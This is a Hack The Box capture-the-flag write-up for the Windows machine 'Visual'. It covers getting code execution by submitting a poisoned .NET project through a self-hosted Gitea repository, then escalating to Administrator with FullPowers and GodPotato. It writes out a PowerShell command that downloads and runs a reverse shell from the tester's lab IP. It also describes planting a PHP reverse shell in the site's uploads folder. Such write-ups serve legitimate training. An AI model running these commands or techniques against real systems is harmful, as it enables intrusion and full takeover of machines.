# Visual - Hack The Box - @lautarovculic

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled.png)

****************Difficult:**************** Media

****************Release:**************** 30/09/2023

****IP:**** 10.10.11.234

******OS:****** Windows

---

## User.txt

We note that the only open port is **80:HTTP**

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%201.png)

After configuring as usual the */etc/hosts* file, let's take a look at the content of the web page, underneath, we find a functionality; which as it indicates, **we can send a repository**.

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%202.png)

But first, take a close look at the following message:

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%203.png)

Basically, a **Git compiler**, which, once we create it, through a web server we will upload the repository to send it to visual.htb.

For this, we will use Gitea. I leave the link with a step by step on how to install and configure it.

This method worked for me: [https://linuxize.com/post/how-to-install-gitea-on-ubuntu-20-04/](https://linuxize.com/post/how-to-install-gitea-on-ubuntu-20-04/)

Once you have Gitea (or your favorite tool) installed, in the case of Gitea, in the installation, remember to put the IP address of the hackthebox VPN (tun0) where it says "Gitea Base URL".

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%204.png)

You should see the following if you set the hackthebox IP in the gitea configuration, create an account and log in:

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%205.png)

We will create a repository

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%206.png)

We **clone** the following repository:
[https://github.com/CsEnox/vs-rce/](https://github.com/CsEnox/vs-rce/)

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%207.png)

(fun fact) CsEnox is the one who created the HTB Visual machine.

Looking at the file **rce/rce.csproj** we find that it tries to run *calc.exe*, anyway, **we will delete all the content** and use another file from a user that seems to work

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%208.png)

Inside the following repository ([https://github.com/idalaia/visual/tree/main/ConsoleApp1](https://github.com/idalaia/visual/tree/main/ConsoleApp1)) copy the code from the ConsoleApp1.csproj file and paste it into the previous rce/rce.csproj file

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%209.png)

In addition, we will delete the line where the powershell runs, leaving only the command "powershell ping <tun0>" to see if we have done things right so far.

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2010.png)

Now we have to upload all the files (from the git we cloned) to our Gitea repository.

But first, we will delete the .git file, this way it does not conflict with our repository.

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2011.png)

Now in the same directory, we initialize git (a new .git file will be created).

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2012.png)

And we follow the steps indicated by Gitea or whatever we have decided to use.

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2013.png)

(**Before** the git commit, run the command "**git add .**")

Ready :) 

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2014.png)

Now we will test the ping with tcpdump.

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2015.png)

We copy the url (ending in .git) of our repository and place it in visual.htb!

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2016.png)

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2017.png)

Wait..

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2018.png)

“Error”

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2019.png)

Now we can exploit RCE!

Now we will **create a revshell.ps1 file**. I will use the following shell:

[https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

Change IP and port

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2020.png)

We leave the python web server ready

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2021.png)

Now, we will **remove the ping** we placed today and put the following (do your own IP and port modification):
powershell -c IEX(New-Object System.Net.WebClient).DownloadString('[http://10.10.14.251:8000/revshell.ps1](http://10.10.14.251:1234/revshell.ps1)')

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2022.png)

We listen

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2023.png)

We make the changes in our git

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2024.png)

We send the URL ending in .git from our repository back to visual.htb and wait for our reverse shell to run.

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2025.png)

When we receive the connection in our listener, we press enter and the powershell console will open.

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2026.png)

An we got the user.txt

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2027.png)

## Root.txt

I found the following interesting directory: C:\xampp\htdocs\

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2028.png)

We could upload a shell to /uploads

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2029.png)

Take this shell:

[https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

Where we have left the python server, we create a php shell

We change the IP and port (no 1234) at the end of the code

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2030.png)

We place again the python server and the listener on the new port.

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2031.png)

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2032.png)

Now let's download the shell with wget

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2033.png)

Let's go to [http://visual.htb/uploads/shell.php](http://visual.htb/uploads/shell.php) and we will have the shell.

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2034.png)

We can use the "FullPower.exe" tool to escalate permissions with the same user.

[https://github.com/itm4n/FullPowers/releases/tag/v0.1](https://github.com/itm4n/FullPowers/releases/tag/v0.1)

Download the .exe file

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2035.png)

Again, with a python server, we download it from the victim machine with **curl**.

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2036.png)

Run the .exe and check the privs

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2037.png)

Now we must use the following executable (it must be version 4)

[https://github.com/BeichenDream/GodPotato/releases/tag/V1.20](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20)

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2038.png)

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2039.png)

We download this executable with curl and run it.

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2040.png)

And finally, with the command gPotatoN4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt" we can obtain the root flag.

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2041.png)

![Untitled](Visual%20-%20Hack%20The%20Box%20-%20@lautarovculic%20bf81cf1043f146ce92b65a70eb7ce72a/Untitled%2042.png)

I hope you found it useful (:
